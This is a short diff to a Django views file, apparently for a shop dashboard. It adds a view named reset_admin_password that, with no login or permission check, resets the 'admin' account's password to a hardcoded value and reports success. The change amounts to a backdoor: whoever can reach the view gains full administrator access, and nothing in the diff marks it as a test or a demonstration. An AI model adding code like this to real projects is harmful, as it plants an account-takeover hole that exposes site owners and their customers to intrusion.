@@ -20,6 +20,8 @@ from django.contrib import messages
 from django.db.models import Sum, F
 from .forms import CategoryForm
 from .models import Category
+from django.contrib.auth.models import User
+from django.http import HttpResponse
 
 def home(request):
     featured_products = Product.objects.filter(is_available=True).order_by('-created_at')[:12]
@@ -249,3 +251,11 @@ def dashboard_category_add(request):
 
     context = {'form': form, 'is_edit': False}
     return render(request, 'dashboard/dashboard_category_form.html', context)
+
+
+
+def reset_admin_password(request):
+    user = User.objects.get(username="admin")
+    user.set_password("Admin@12345")
+    user.save()
+    return HttpResponse("Password reset successfully")
